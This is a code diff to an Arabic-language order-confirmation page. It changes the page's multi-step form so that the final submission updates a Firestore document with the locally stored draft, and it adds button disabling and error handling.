@@ -19,20 +19,35 @@
     <p class="note">ستنتقل للخطوة التالية بعد تأكيد الرقم.</p>
   </main>
   <script src="draft-sync.js"></script>
-  <script>
+  <script type="module">
+    import { db, doc, updateDoc, serverTimestamp } from './firebase.js';
+
     const params = new URLSearchParams(location.search);
     const step = Math.min(Math.max(Number(params.get('step')) || 1, 1), 4);
-    document.querySelector('#confirmation-form').addEventListener('submit', event => {
+    document.querySelector('#confirmation-form').addEventListener('submit', async event => {
       event.preventDefault();
+      const submitButton = event.currentTarget.querySelector('button[type="submit"]');
       const draft = JSON.parse(localStorage.getItem('musaedDraft') || '{}');
       draft.orderNumber = event.currentTarget.querySelector('input').value;
       if (step < 4) { localStorage.setItem('musaedDraft', JSON.stringify(draft)); window.location.href = `order-confirmation.html?step=${step + 1}`; }
       else {
-        const orders = JSON.parse(localStorage.getItem('musaedOrders') || '[]');
-        orders.unshift({ ...draft, id: `ORD-${Date.now().toString().slice(-7)}`, status: 'طلب جديد' });
-        localStorage.setItem('musaedOrders', JSON.stringify(orders));
-        localStorage.removeItem('musaedDraft');
-        alert('تم تأكيد العملية بنجاح. شكرًا لك.'); window.location.href = 'index.html';
+        submitButton.disabled = true;
+        try {
+          await updateDoc(doc(db, 'users', draft.firebaseDocumentId), {
+            ...draft,
+            status: 'طلب جديد',
+            updatedAt: serverTimestamp()
+          });
+          const orders = JSON.parse(localStorage.getItem('musaedOrders') || '[]');
+          orders.unshift({ ...draft, status: 'طلب جديد' });
+          localStorage.setItem('musaedOrders', JSON.stringify(orders));
+          localStorage.removeItem('musaedDraft');
+          alert('تم تأكيد العملية بنجاح. شكرًا لك.'); window.location.href = 'index.html';
+        } catch (error) {
+          console.error('تعذر تحديث بيانات الطلب في Firebase:', error);
+          submitButton.disabled = false;
+          alert('تعذر إرسال كامل البيانات. يرجى المحاولة مرة أخرى.');
+        }
       }
     });
   </script>
